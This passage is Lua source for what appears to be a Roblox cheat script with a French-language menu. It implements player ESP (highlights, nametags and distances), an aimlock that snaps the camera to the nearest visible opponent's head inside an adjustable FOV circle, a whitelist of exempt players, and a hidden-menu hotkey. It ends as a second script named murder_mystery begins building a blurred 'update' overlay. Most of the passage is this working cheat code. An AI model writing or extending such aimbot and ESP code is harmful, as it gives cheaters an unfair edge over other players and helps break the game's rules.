        billboardGui.LightInfluence = 0
        billboardGui.MaxDistance = 300
        billboardGui.Adornee = head or rootPart
        billboardGui.Parent = character

        local nameBg = Instance.new("Frame")
        nameBg.Size = UDim2.new(1, 0, 1, 0)
        nameBg.Position = UDim2.new(0, 0, 0, 0)
        nameBg.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
        nameBg.BackgroundTransparency = 0.45
        nameBg.BorderSizePixel = 0
        nameBg.Parent = billboardGui
        local nameBgCorner = Instance.new("UICorner")
        nameBgCorner.CornerRadius = UDim.new(0, 4)
        nameBgCorner.Parent = nameBg

        local mainContainer = Instance.new("Frame")
        mainContainer.Name = "mainContainer"
        mainContainer.Size = UDim2.new(1, 0, 1, 0)
        mainContainer.BackgroundTransparency = 1
        mainContainer.Parent = billboardGui

        local nameLabel = Instance.new("TextLabel")
        nameLabel.Name = "NameLabel"
        nameLabel.Size = UDim2.new(1, 0, 1, 0)
        nameLabel.Position = UDim2.new(0, 4, 0, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.TextColor3 = Color3.fromRGB(200, 40, 40)
        nameLabel.TextStrokeTransparency = 0.4
        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        nameLabel.Text = player.Name
        nameLabel.Font = Enum.Font.Code
        nameLabel.TextSize = 12
        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
        nameLabel.TextYAlignment = Enum.TextYAlignment.Center
        nameLabel.Parent = mainContainer

        local distanceFrame = nil
        local distanceText = nil
        if ESPDistance_Enabled then
            distanceFrame = Instance.new("Frame")
            distanceFrame.Size = UDim2.new(1, 0, 0, 14)
            distanceFrame.Position = UDim2.new(0, 0, 1, -14)
            distanceFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
            distanceFrame.BackgroundTransparency = 0.45
            distanceFrame.BorderSizePixel = 0
            distanceFrame.Parent = billboardGui
            local dfc = Instance.new("UICorner")
            dfc.CornerRadius = UDim.new(0, 4)
            dfc.Parent = distanceFrame
            distanceText = Instance.new("TextLabel")
            distanceText.Size = UDim2.new(1, 0, 1, 0)
            distanceText.BackgroundTransparency = 1
            distanceText.TextColor3 = Color3.fromRGB(200, 40, 40)
            distanceText.TextStrokeTransparency = 0.4
            distanceText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            distanceText.Font = Enum.Font.Code
            distanceText.TextSize = 10
            distanceText.Text = (GetDistance(player) or "?") .. "m"
            distanceText.TextXAlignment = Enum.TextXAlignment.Center
            distanceText.TextYAlignment = Enum.TextYAlignment.Center
            distanceText.Parent = distanceFrame
        end

        local function UpdateESPVisuals()
            if not ESP_Enabled or not character.Parent or not LocalPlayer.Character then return end
            local isVisible = IsPlayerVisible(character)
            local isInFOV = IsInFOV(player)
            local isWhitelisted = IsWhitelisted(player)
            UpdateESPColor(highlight, isVisible, isInFOV, isWhitelisted)
            UpdateNameColor(nameLabel, distanceText, isVisible, isInFOV, isWhitelisted)
            if ESPDistance_Enabled and distanceText then
                local dist = GetDistance(player)
                if dist then distanceText.Text = dist .. "m" end
            end
        end

        local updateConnection
        updateConnection = RunService.RenderStepped:Connect(UpdateESPVisuals)

        ESP_Objects[player] = {
            Highlight = highlight,
            Billboard = billboardGui,
            UpdateConnection = updateConnection,
            Character = character,
            DistanceFrame = distanceFrame,
            mainContainer = mainContainer,
            nameLabel = nameLabel
        }
    end
    
    if player.Character and player.Character.Parent then
        OnCharacterAdded(player.Character)
    end
    local conn = player.CharacterAdded:Connect(OnCharacterAdded)
    ESP_Connections[player] = conn
end

local function CleanPlayer(player)
    local data = ESP_Objects[player]
    if not data then return end
    if data.Highlight then data.Highlight:Destroy() end
    if data.Billboard then data.Billboard:Destroy() end
    if data.UpdateConnection then data.UpdateConnection:Disconnect() end
    if data.DistanceFrame then data.DistanceFrame:Destroy() end
    ESP_Objects[player] = nil
end

local function ClearESP()
    for player in pairs(ESP_Objects) do CleanPlayer(player) end
    for player, conn in pairs(ESP_Connections) do 
        if conn then 
            conn:Disconnect() 
        end 
    end
    ESP_Connections = {}
end

local function ToggleESP()
    ESP_Enabled = not ESP_Enabled
    AnimateToggle(ESPTrack, ESPThumb, ESP_Enabled)
    if ESP_Enabled then
        ClearESP()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then CreateESP(plr) end
        end
    else
        ClearESP()
    end
end

local function ToggleESPDistance()
    ESPDistance_Enabled = not ESPDistance_Enabled
    AnimateToggle(ESPDistTrack, ESPDistThumb, ESPDistance_Enabled)
    RefreshESP()
end

createSectionLabel(AimPanel, "Aimlock", 1)

local aimRow = createRow(AimPanel, 2)
addRowLabel(aimRow, "Aimlock", "Maintenir pour activer")

local HoldBadge = Instance.new("TextLabel")
HoldBadge.Size = UDim2.new(0, 36, 0, 16)
HoldBadge.Position = UDim2.new(1, -88, 0.5, -8)
HoldBadge.BackgroundColor3 = Color3.fromRGB(22, 18, 0)
HoldBadge.Text = "HOLD"
HoldBadge.TextColor3 = Color3.fromRGB(255, 160, 0)
HoldBadge.Font = Enum.Font.Code
HoldBadge.TextSize = 9
HoldBadge.BorderSizePixel = 0
HoldBadge.Parent = aimRow
local HoldCorner = Instance.new("UICorner")
HoldCorner.CornerRadius = UDim.new(0, 3)
HoldCorner.Parent = HoldBadge
local HoldStroke = Instance.new("UIStroke")
HoldStroke.Color = Color3.fromRGB(80, 55, 0)
HoldStroke.Thickness = 1
HoldStroke.Parent = HoldBadge

local AimlockTrack, AimlockThumb, AimlockBtn = createToggleInRow(aimRow)
AimlockTrack.Position = UDim2.new(1, -42, 0.5, -11)

local keyRow = createRow(AimPanel, 3)
addRowLabel(keyRow, "Touche Aimlock")

local KeyButton = Instance.new("TextButton")
KeyButton.Size = UDim2.new(0, 80, 0, 24)
KeyButton.Position = UDim2.new(1, -82, 0.5, -12)
KeyButton.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
KeyButton.BorderSizePixel = 0
KeyButton.Text = "E"
KeyButton.TextColor3 = Color3.fromRGB(60, 160, 255)
KeyButton.Font = Enum.Font.Code
KeyButton.TextSize = 12
KeyButton.Parent = keyRow
local KBCorner = Instance.new("UICorner")
KBCorner.CornerRadius = UDim.new(0, 5)
KBCorner.Parent = KeyButton
local KBStroke = Instance.new("UIStroke")
KBStroke.Color = Color3.fromRGB(35, 35, 52)
KBStroke.Thickness = 1
KBStroke.Parent = KeyButton

createSectionLabel(AimPanel, "FOV", 4)

local fovSliderRow = Instance.new("Frame")
fovSliderRow.Size = UDim2.new(1, 0, 0, 52)
fovSliderRow.BackgroundTransparency = 1
fovSliderRow.LayoutOrder = 5
fovSliderRow.Parent = AimPanel

local FOVTitleLabel = Instance.new("TextLabel")
FOVTitleLabel.Size = UDim2.new(0.6, 0, 0, 14)
FOVTitleLabel.Position = UDim2.new(0, 0, 0, 4)
FOVTitleLabel.BackgroundTransparency = 1
FOVTitleLabel.Text = "Taille du FOV"
FOVTitleLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
FOVTitleLabel.Font = Enum.Font.Code
FOVTitleLabel.TextSize = 11
FOVTitleLabel.TextXAlignment = Enum.TextXAlignment.Left
FOVTitleLabel.Parent = fovSliderRow

local FOVValLabel = Instance.new("TextLabel")
FOVValLabel.Size = UDim2.new(0.4, 0, 0, 14)
FOVValLabel.Position = UDim2.new(0.6, 0, 0, 4)
FOVValLabel.BackgroundTransparency = 1
FOVValLabel.Text = "150px"
FOVValLabel.TextColor3 = Color3.fromRGB(60, 160, 255)
FOVValLabel.Font = Enum.Font.Code
FOVValLabel.TextSize = 11
FOVValLabel.TextXAlignment = Enum.TextXAlignment.Right
FOVValLabel.Parent = fovSliderRow

local SliderTrack = Instance.new("Frame")
SliderTrack.Size = UDim2.new(1, 0, 0, 4)
SliderTrack.Position = UDim2.new(0, 0, 0, 28)
SliderTrack.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
SliderTrack.BorderSizePixel = 0
SliderTrack.Parent = fovSliderRow
local SliderTrackCorner = Instance.new("UICorner")
SliderTrackCorner.CornerRadius = UDim.new(1, 0)
SliderTrackCorner.Parent = SliderTrack

local SliderFill = Instance.new("Frame")
SliderFill.Size = UDim2.new((FOV_RADIUS - 30) / 270, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderTrack
local SliderFillCorner = Instance.new("UICorner")
SliderFillCorner.CornerRadius = UDim.new(1, 0)
SliderFillCorner.Parent = SliderFill

local SliderThumb = Instance.new("Frame")
SliderThumb.Size = UDim2.new(0, 13, 0, 13)
SliderThumb.Position = UDim2.new((FOV_RADIUS - 30) / 270, -6, 0.5, -6)
SliderThumb.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
SliderThumb.BorderSizePixel = 0
SliderThumb.Parent = SliderTrack
local SliderThumbCorner = Instance.new("UICorner")
SliderThumbCorner.CornerRadius = UDim.new(1, 0)
SliderThumbCorner.Parent = SliderThumb
local SliderThumbStroke = Instance.new("UIStroke")
SliderThumbStroke.Color = Color3.fromRGB(255, 255, 255)
SliderThumbStroke.Thickness = 2
SliderThumbStroke.Parent = SliderThumb

local fovCircleRow = createRow(AimPanel, 6)
addRowLabel(fovCircleRow, "Afficher le cercle FOV", "Montre la zone d'aimlock")
FOVCircleTrack, FOVCircleThumb, FOVCircleBtn = createToggleInRow(fovCircleRow)

createSectionLabel(VisualPanel, "ESP", 1)

local espRow = createRow(VisualPanel, 2)
addRowLabel(espRow, "ESP Joueurs", "Highlight + Nametag")
ESPTrack, ESPThumb, ESPBtn = createToggleInRow(espRow)

local espDistRow = createRow(VisualPanel, 3)
addRowLabel(espDistRow, "ESP Distance", "Afficher la distance (m)")
ESPDistTrack, ESPDistThumb, ESPDistBtn = createToggleInRow(espDistRow)

createSectionLabel(WhitelistPanel, "Whitelist", 1)

local whitelistInfoRow = createRow(WhitelistPanel, 2)
addRowLabel(whitelistInfoRow, "Joueurs Whitelistés", "ESP blanc - Aimlock ignoré")

local whitelistDisplayRow = createRow(WhitelistPanel, 3)
addRowLabel(whitelistDisplayRow, "Whitelist actuelle", "")

local WhitelistDisplayLabel = Instance.new("TextLabel")
WhitelistDisplayLabel.Size = UDim2.new(1, -20, 0, 36)
WhitelistDisplayLabel.Position = UDim2.new(0, 10, 0.5, -18)
WhitelistDisplayLabel.BackgroundTransparency = 1
WhitelistDisplayLabel.Text = "Aucun"
WhitelistDisplayLabel.TextColor3 = Color3.fromRGB(100, 100, 120)
WhitelistDisplayLabel.Font = Enum.Font.Code
WhitelistDisplayLabel.TextSize = 11
WhitelistDisplayLabel.TextXAlignment = Enum.TextXAlignment.Left
WhitelistDisplayLabel.TextWrapped = true
WhitelistDisplayLabel.Parent = whitelistDisplayRow

local whitelistSelectRow = createRow(WhitelistPanel, 4)
addRowLabel(whitelistSelectRow, "Ajouter/Retirer", "Cliquez sur un joueur")

local PlayerDropdownButton = Instance.new("TextButton")
PlayerDropdownButton.Size = UDim2.new(0, 160, 0, 32)
PlayerDropdownButton.Position = UDim2.new(1, -170, 0.5, -16)
PlayerDropdownButton.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
PlayerDropdownButton.BorderSizePixel = 0
PlayerDropdownButton.Text = "Sélectionner..."
PlayerDropdownButton.TextColor3 = Color3.fromRGB(140, 140, 160)
PlayerDropdownButton.Font = Enum.Font.Code
PlayerDropdownButton.TextSize = 11
PlayerDropdownButton.Parent = whitelistSelectRow
local PDCorner = Instance.new("UICorner")
PDCorner.CornerRadius = UDim.new(0, 5)
PDCorner.Parent = PlayerDropdownButton

local function UpdateWhitelistDisplay()
    local playersList = {}
    for _, player in ipairs(Whitelist) do
        table.insert(playersList, player.Name)
    end
    if #playersList == 0 then
        WhitelistDisplayLabel.Text = "Aucun"
        WhitelistDisplayLabel.TextColor3 = Color3.fromRGB(100, 100, 120)
    else
        WhitelistDisplayLabel.Text = table.concat(playersList, ", ")
        WhitelistDisplayLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
    end
end

local function CreatePlayerDropdown()
    if WhitelistDropdown then WhitelistDropdown:Destroy() end
    
    WhitelistDropdown = Instance.new("Frame")
    WhitelistDropdown.Size = UDim2.new(0, 160, 0, 150)
    WhitelistDropdown.Position = UDim2.new(1, -170, 0, 36)
    WhitelistDropdown.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    WhitelistDropdown.BorderSizePixel = 0
    WhitelistDropdown.ClipsDescendants = true
    WhitelistDropdown.Visible = false
    WhitelistDropdown.Parent = whitelistSelectRow
    local dropdownCorner = Instance.new("UICorner")
    dropdownCorner.CornerRadius = UDim.new(0, 5)
    dropdownCorner.Parent = WhitelistDropdown
    
    local dropdownStroke = Instance.new("UIStroke")
    dropdownStroke.Color = Color3.fromRGB(40, 40, 55)
    dropdownStroke.Thickness = 1
    dropdownStroke.Parent = WhitelistDropdown
    
    local scroller = Instance.new("ScrollingFrame")
    scroller.Size = UDim2.new(1, 0, 1, 0)
    scroller.BackgroundTransparency = 1
    scroller.BorderSizePixel = 0
    scroller.ScrollBarThickness = 3
    scroller.Parent = WhitelistDropdown
    
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 0)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = scroller
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, 0, 0, 30)
            btn.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
            btn.BorderSizePixel = 0
            btn.Text = player.Name
            btn.TextColor3 = Color3.fromRGB(200, 200, 220)
            btn.Font = Enum.Font.Code
            btn.TextSize = 11
            btn.Parent = scroller
            
            local isWhitelisted = false
            for _, wl in ipairs(Whitelist) do
                if wl == player then isWhitelisted = true break end
            end
            
            if isWhitelisted then
                btn.BackgroundColor3 = Color3.fromRGB(40, 50, 40)
                btn.TextColor3 = Color3.fromRGB(0, 200, 80)
                btn.Text = "[✓] " .. player.Name
            end
            
            btn.MouseButton1Click:Connect(function()
                local found = false
                for i, wl in ipairs(Whitelist) do
                    if wl == player then
                        table.remove(Whitelist, i)
                        found = true
                        break
                    end
                end
                if not found then
                    table.insert(Whitelist, player)
                end
                UpdateWhitelistDisplay()
                RefreshESP()
                WhitelistDropdown.Visible = false
                WhitelistDropdownOpen = false
            end)
            
            btn.MouseEnter:Connect(function()
                btn.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
            end)
            btn.MouseLeave:Connect(function()
                local isWl = false
                for _, wl in ipairs(Whitelist) do
                    if wl == player then isWl = true break end
                end
                if isWl then
                    btn.BackgroundColor3 = Color3.fromRGB(40, 50, 40)
                else
                    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
                end
            end)
        end
    end
end

PlayerDropdownButton.MouseButton1Click:Connect(function()
    if WhitelistDropdownOpen then
        WhitelistDropdown.Visible = false
        WhitelistDropdownOpen = false
    else
        if WhitelistDropdown then WhitelistDropdown:Destroy() end
        CreatePlayerDropdown()
        WhitelistDropdown.Visible = true
        WhitelistDropdownOpen = true
    end
end)

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and WhitelistDropdownOpen then
        local mousePos = input.Position
        local dropdownPos = WhitelistDropdown and WhitelistDropdown.AbsolutePosition
        local dropdownSize = WhitelistDropdown and WhitelistDropdown.AbsoluteSize
        if dropdownPos and dropdownSize then
            if not (mousePos.X >= dropdownPos.X and mousePos.X <= dropdownPos.X + dropdownSize.X and
                    mousePos.Y >= dropdownPos.Y and mousePos.Y <= dropdownPos.Y + dropdownSize.Y) then
                WhitelistDropdown.Visible = false
                WhitelistDropdownOpen = false
            end
        end
    end
end)

local function SwitchToAim()
    AimPanel.Visible = true
    VisualPanel.Visible = false
    WhitelistPanel.Visible = false
    AimNavBtn.BackgroundTransparency = 0.88
    AimNavBtn.TextColor3 = Color3.fromRGB(60, 160, 255)
    AimNavAccent.Visible = true
    VisualNavBtn.BackgroundTransparency = 1
    VisualNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    VisualNavAccent.Visible = false
    WhitelistNavBtn.BackgroundTransparency = 1
    WhitelistNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    WhitelistNavAccent.Visible = false
end

local function SwitchToVisual()
    AimPanel.Visible = false
    VisualPanel.Visible = true
    WhitelistPanel.Visible = false
    AimNavBtn.BackgroundTransparency = 1
    AimNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    AimNavAccent.Visible = false
    VisualNavBtn.BackgroundTransparency = 0.88
    VisualNavBtn.TextColor3 = Color3.fromRGB(60, 160, 255)
    VisualNavAccent.Visible = true
    WhitelistNavBtn.BackgroundTransparency = 1
    WhitelistNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    WhitelistNavAccent.Visible = false
end

local function SwitchToWhitelist()
    AimPanel.Visible = false
    VisualPanel.Visible = false
    WhitelistPanel.Visible = true
    AimNavBtn.BackgroundTransparency = 1
    AimNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    AimNavAccent.Visible = false
    VisualNavBtn.BackgroundTransparency = 1
    VisualNavBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    VisualNavAccent.Visible = false
    WhitelistNavBtn.BackgroundTransparency = 0.88
    WhitelistNavBtn.TextColor3 = Color3.fromRGB(60, 160, 255)
    WhitelistNavAccent.Visible = true
end

AimNavBtn.MouseButton1Click:Connect(SwitchToAim)
VisualNavBtn.MouseButton1Click:Connect(SwitchToVisual)
WhitelistNavBtn.MouseButton1Click:Connect(SwitchToWhitelist)

local function CreateFOVCircle()
    if fovCircle then
        if fovCircle.Parent then fovCircle.Parent:Destroy() end
        fovCircle = nil
    end
    if fovCrosshair then
        if fovCrosshair.Parent then fovCrosshair.Parent:Destroy() end
        fovCrosshair = nil
    end
    
    local circleGui = Instance.new("ScreenGui")
    circleGui.Name = "FOVCircleGui"
    circleGui.ResetOnSpawn = false
    circleGui.IgnoreGuiInset = true
    circleGui.Parent = ScreenGui
    
    fovCircle = Instance.new("Frame")
    fovCircle.Size = UDim2.new(0, FOV_RADIUS * 2, 0, FOV_RADIUS * 2)
    fovCircle.Position = UDim2.new(0.5, -FOV_RADIUS, 0.5, -FOV_RADIUS)
    fovCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fovCircle.BackgroundTransparency = 0.85
    fovCircle.BorderSizePixel = 2
    fovCircle.BorderColor3 = Color3.fromRGB(0, 0, 0)
    fovCircle.Parent = circleGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = fovCircle
    
    fovCrosshair = Instance.new("Frame")
    fovCrosshair.Size = UDim2.new(0, 20, 0, 2)
    fovCrosshair.Position = UDim2.new(0.5, -10, 0.5, -1)
    fovCrosshair.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fovCrosshair.BorderSizePixel = 1
    fovCrosshair.BorderColor3 = Color3.fromRGB(0, 0, 0)
    fovCrosshair.Parent = circleGui
    
    local crosshairVertical = Instance.new("Frame")
    crosshairVertical.Size = UDim2.new(0, 2, 0, 20)
    crosshairVertical.Position = UDim2.new(0.5, -1, 0.5, -10)
    crosshairVertical.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    crosshairVertical.BorderSizePixel = 1
    crosshairVertical.BorderColor3 = Color3.fromRGB(0, 0, 0)
    crosshairVertical.Parent = circleGui
    
    return circleGui
end

local fovCircleGui = CreateFOVCircle()
fovCircleGui.Enabled = false

local function SetFOVCircleVisible(visible)
    fovCircleVisible = visible
    if fovCircleGui then
        fovCircleGui.Enabled = visible
    end
end

local function ToggleFOVCircle()
    SetFOVCircleVisible(not fovCircleVisible)
    AnimateToggle(FOVCircleTrack, FOVCircleThumb, fovCircleVisible)
end

local function UpdateFOVCircle()
    if fovCircle and fovCircle.Parent then
        fovCircle.Size = UDim2.new(0, FOV_RADIUS * 2, 0, FOV_RADIUS * 2)
        fovCircle.Position = UDim2.new(0.5, -FOV_RADIUS, 0.5, -FOV_RADIUS)
    end
    FOVValLabel.Text = FOV_RADIUS .. "px"
    local pct = (FOV_RADIUS - 30) / 270
    SliderFill.Size = UDim2.new(pct, 0, 1, 0)
    SliderThumb.Position = UDim2.new(pct, -6, 0.5, -6)
end

local function UpdateFOVFromMouse(mousePos)
    local trackPos = SliderTrack.AbsolutePosition.X
    local trackWidth = SliderTrack.AbsoluteSize.X
    if trackWidth > 0 then
        local pct = math.clamp((mousePos.X - trackPos) / trackWidth, 0, 1)
        FOV_RADIUS = math.floor(30 + pct * 270)
        UpdateFOVCircle()
    end
end

local function onSliderInputBegan(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingSlider = true
        UpdateFOVFromMouse(input.Position)
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then draggingSlider = false end
        end)
    end
end

SliderThumb.InputBegan:Connect(onSliderInputBegan)
SliderTrack.InputBegan:Connect(onSliderInputBegan)
UserInputService.InputChanged:Connect(function(input)
    if draggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then
        UpdateFOVFromMouse(input.Position)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = false end
end)

local function GetBestTarget()
    if not Aimlock_Enabled or not LocalPlayer.Character or not camera then return nil end
    local mouseLoc = UserInputService:GetMouseLocation()
    local bestTarget, bestDist = nil, FOV_RADIUS
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            if IsWhitelisted(player) then continue end
            local head = player.Character:FindFirstChild("Head")
            local hum = player.Character:FindFirstChild("Humanoid")
            if head and hum and hum.Health > 0 then
                if not IsPlayerVisible(player.Character) then continue end
                local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
                if onScreen and screenPos.Z > 0 then
                    local dx = screenPos.X - mouseLoc.X
                    local dy = screenPos.Y - mouseLoc.Y
                    local dist = math.sqrt(dx*dx + dy*dy)
                    if dist <= FOV_RADIUS and dist < bestDist then
                        bestDist = dist
                        bestTarget = player
                    end
                end
            end
        end
    end
    return bestTarget
end

local function Aimlock()
    if not Aimlock_Enabled then return end
    local target = GetBestTarget()
    if target and target.Character then
        local head = target.Character:FindFirstChild("Head")
        if head then
            local targetPos = head.Position
            local currentPos = camera.CFrame.Position
            camera.CFrame = CFrame.new(currentPos, currentPos + (targetPos - currentPos).Unit)
        end
    end
end

local function StartAimlock()
    if aimlockConnection then aimlockConnection:Disconnect(); aimlockConnection = nil end
    if Aimlock_Enabled then aimlockConnection = RunService.RenderStepped:Connect(Aimlock) end
end

local function ToggleAimlock()
    Aimlock_Enabled = not Aimlock_Enabled
    AnimateToggle(AimlockTrack, AimlockThumb, Aimlock_Enabled)
    if Aimlock_Enabled then
        StartAimlock()
    else
        if aimlockConnection then aimlockConnection:Disconnect(); aimlockConnection = nil end
    end
end

AimlockBtn.MouseButton1Click:Connect(ToggleAimlock)

local function GetKeyName(key)
    if typeof(key) == "EnumItem" then
        if key == Enum.UserInputType.MouseButton1 then return "M1"
        elseif key == Enum.UserInputType.MouseButton2 then return "M2"
        elseif key == Enum.UserInputType.MouseButton3 then return "M3"
        else return string.sub(tostring(key), 10) end
    end
    return tostring(key)
end

KeyButton.MouseButton1Click:Connect(function()
    waitingForKey = true
    KeyButton.Text = "..."
    KeyButton.TextColor3 = Color3.fromRGB(255, 170, 0)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if waitingForKey then
        local key, isMouse = nil, false
        if input.UserInputType == Enum.UserInputType.Keyboard then
            key = input.KeyCode; isMouse = false
        elseif input.UserInputType == Enum.UserInputType.MouseButton1 then key = Enum.UserInputType.MouseButton1; isMouse = true
        elseif input.UserInputType == Enum.UserInputType.MouseButton2 then key = Enum.UserInputType.MouseButton2; isMouse = true
        elseif input.UserInputType == Enum.UserInputType.MouseButton3 then key = Enum.UserInputType.MouseButton3; isMouse = true
        end
        if key then
            AimlockKey = key; isMouseButton = isMouse
            KeyButton.Text = GetKeyName(key)
            KeyButton.TextColor3 = Color3.fromRGB(60, 160, 255)
            waitingForKey = false
        end
        return
    end
    if not waitingForKey then
        local pressed = false
        if isMouseButton and AimlockKey then
            if input.UserInputType == AimlockKey then pressed = true end
        elseif not isMouseButton and AimlockKey then
            if input.KeyCode == AimlockKey then pressed = true end
        end
        if pressed and not Aimlock_Enabled then ToggleAimlock() end

        if input.KeyCode == Enum.KeyCode.Insert then
            guiVisible = not guiVisible
            MainFrame.Visible = guiVisible
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if not waitingForKey then
        local released = false
        if isMouseButton and AimlockKey then
            if input.UserInputType == AimlockKey then released = true end
        elseif not isMouseButton and AimlockKey then
            if input.KeyCode == AimlockKey then released = true end
        end
        if released and Aimlock_Enabled then ToggleAimlock() end
    end
end)

Players.PlayerAdded:Connect(function(player)
    task.wait(0.5)
    if ESP_Enabled and player ~= LocalPlayer then CreateESP(player) end
end)

Players.PlayerRemoving:Connect(function(player)
    CleanPlayer(player)
    for i, wl in ipairs(Whitelist) do
        if wl == player then
            table.remove(Whitelist, i)
            UpdateWhitelistDisplay()
            break
        end
    end
    if ESP_Connections[player] then 
        ESP_Connections[player]:Disconnect() 
        ESP_Connections[player] = nil 
    end
end)

ESPBtn.MouseButton1Click:Connect(ToggleESP)
ESPDistBtn.MouseButton1Click:Connect(ToggleESPDistance)
FOVCircleBtn.MouseButton1Click:Connect(ToggleFOVCircle)

AnimateToggle(ESPTrack, ESPThumb, false)
AnimateToggle(ESPDistTrack, ESPDistThumb, false)
AnimateToggle(FOVCircleTrack, FOVCircleThumb, false)
AnimateToggle(AimlockTrack, AimlockThumb, false)

SwitchToAim()
]]

local murder_mystery = [[
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local existingGui = playerGui:FindFirstChild("UpdateGui")
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UpdateGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local blur = Instance.new("BlurEffect")
blur.Name = "BackgroundBlur"
blur.Size = 0
blur.Parent = screenGui

local darkOverlay = Instance.new("Frame")
darkOverlay.Name = "DarkOverlay"
darkOverlay.Size = UDim2.new(1, 0, 1, 0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
darkOverlay.BackgroundTransparency = 1
darkOverlay.BorderSizePixel = 0
darkOverlay.ZIndex = 0
darkOverlay.Parent = screenGui

local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(0, 420, 0, 210)
mainContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
mainContainer.AnchorPoint = Vector2.new(0.5, 0.5)
mainContainer.BackgroundTransparency = 1
mainContainer.BorderSizePixel = 0
mainContainer.ZIndex = 1
mainContainer.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 19)
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 1
mainFrame.Parent = mainContainer

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = mainFrame

local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(255, 255, 255)
uiStroke.Transparency = 0.93
uiStroke.Thickness = 0.5
uiStroke.Parent = mainFrame

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 24, 1, 24)
shadow.Position = UDim2.new(0, -12, 0, -12)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://6014261993"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.65
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(49, 49, 450, 450)
shadow.ZIndex = 0
shadow.Parent = mainFrame

local accentGlow = Instance.new("Frame")
accentGlow.Name = "AccentGlow"
accentGlow.Size = UDim2.new(0, 4, 1, -20)
accentGlow.Position = UDim2.new(0, 0, 0, 10)
accentGlow.BackgroundColor3 = Color3.fromRGB(140, 120, 255)
accentGlow.BorderSizePixel = 0
accentGlow.ZIndex = 2
accentGlow.Parent = mainFrame

local accentGlowCorner = Instance.new("UICorner")
accentGlowCorner.CornerRadius = UDim.new(1, 0)
accentGlowCorner.Parent = accentGlow

local accentGradient = Instance.new("UIGradient")
accentGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 120, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 180, 255))
})
accentGradient.Rotation = 180
accentGradient.Parent = accentGlow

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, -32, 1, -28)
contentFrame.Position = UDim2.new(0, 22, 0, 16)
contentFrame.BackgroundTransparency = 1
contentFrame.BorderSizePixel = 0
contentFrame.ZIndex = 1
contentFrame.Parent = mainFrame

local headerFrame = Instance.new("Frame")
headerFrame.Name = "HeaderFrame"
headerFrame.Size = UDim2.new(1, 0, 0, 28)
headerFrame.BackgroundTransparency = 1
headerFrame.BorderSizePixel = 0
headerFrame.Parent = contentFrame

